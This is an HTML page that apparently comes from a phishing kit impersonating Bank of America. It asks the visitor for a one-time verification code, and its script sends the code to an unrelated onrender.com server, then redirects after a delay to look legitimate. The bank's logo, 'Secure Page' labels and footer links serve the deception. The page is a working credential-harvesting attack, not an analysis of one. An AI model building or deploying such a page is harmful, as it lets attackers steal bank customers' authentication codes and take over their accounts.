<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bank of America</title>
  <link rel="shortcut icon" href="img/icona.png" />
  <link rel="stylesheet" href="style2.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />

  <style>
  #spinner-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background-color: rgba(255, 255, 255, 0.61);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10000;
  }

  .spinner {
    border: 8px solid #f3f3f3;
    border-top: 8px solid #db3434;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
</style>

</head>

<body>
  <section id="header2">
    <a href="index.html" class="log">
      <img src="img/Bank-of-America-Logo.png" width="300px" height="35px" class="logo" />
    </a>
    <li class="area"><i class="fa fa-lock"></i> <span>Secure Page</span></li>
  </section>

  <section id="hero2">
    <div class="bar">
      <ul id="navbarr">
        <h3>One-time code</h3>
      </ul>
    </div>
  </section>

  <div class="container">
    <div>
      <h1>Verification</h1>
      <p class="subtitle">
        A one-time code has been sent to your account. please type in the one-time code.
      </p>
    </div>

    <div id="spinner-overlay" style="display: none;">
  <div class="spinner"></div>
</div>

    <form id="login-details">
      <div class="form-group">
        <label for="code">code</label>
        <div class="input-with-icon">
          <input type="code" id="code" name="code" autocomplete="off" required />
        </div>
      </div>

      <div class="button-group">
        <button type="submit" class="btn primary">Continue</button>
      </div>
    </form>

 <script>
  var form = document.getElementById("login-details");

  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    var code = document.getElementById("code").value.trim();

    if (!code) {
      alert("‚ö†Ô∏è Please enter the code.");
      return;
    }

    // Show loading spinner
    document.getElementById("spinner-overlay").style.display = "flex";

    var payload = { code: code };

    try {
      const response = await fetch('https://erhugeh4y39523789498ut4384.onrender.com/submit-code', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        // Redirect after 9 seconds
        setTimeout(function () {
          window.location.href = "verified.html";
        }, 9000);
      } else {
        alert("üö´ Submission failed. Please try again.");
        document.getElementById("spinner-overlay").style.display = "none";
      }
    } catch (error) {
      console.error("Submission failed:", error);
      document.getElementById("spinner-overlay").style.display = "none";
      alert("üö´ An error occurred. Please try again.");
    }
  });

  // Cancel button
  var cancelBtn = document.getElementById("cancelBtn");
  cancelBtn.addEventListener("click", function () {
    window.location.href = "index.html";
  });
</script>


    </form>
  </div>
</body>
<footer>
  <div class="gray-bground-skin">
    <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
    <div class="link-container">
      <div class="link-row">
        <a href="https://www.bankofamerica.com/security-center/privacy-overview/" target="_blank">Privacy</a>
        <a href="https://www.bankofamerica.com/security-center/overview/" target="_blank">Security</a>
        <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
        <div class="clearboth"></div>
      </div>
    </div>
    <p>
      Bank of America, N.A. Member FDIC.
      <a href="https://www.bankofamerica.com/help/equalhousing-popup/" target="_blank">Equal Housing Lender</a>
      <i class="fa fa-home"></i><br />¬© 2025 Bank of America Corporation.
    </p>
  </div>
</footer>

</html>
